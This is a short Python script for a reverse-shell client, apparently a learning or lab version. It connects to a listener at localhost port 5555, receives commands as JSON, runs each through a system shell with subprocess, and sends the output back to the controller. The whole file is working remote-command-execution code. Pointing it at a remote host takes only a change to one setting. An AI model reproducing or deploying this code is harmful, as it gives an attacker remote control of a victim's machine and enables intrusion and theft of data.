import socket
import json
import subprocess
import os

def send(data):
    jsonData = json.dumps(data)
    s.send(jsonData.encode())

# In order not to overflow the default socket.recv() function
# the function recv() reads the data in chunks of 1024 bytes
# at a time and appends it to the data variable.
def recv():
    data = ''

    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        
        except ValueError:
            continue

def shell():
    while True:

        command = recv()

        if command == 'exit': # Exit the loop if the exit message is received 
            break

        elif command == 'help':
            pass

        elif command == 'clear':
            pass

        elif command[:3] == 'cd ': # Change to the specified directory
            os.chdir(command[3:])

        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            send(result)

# Connection data
HOST = '127.0.0.1'
PORT = 5555

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

shell()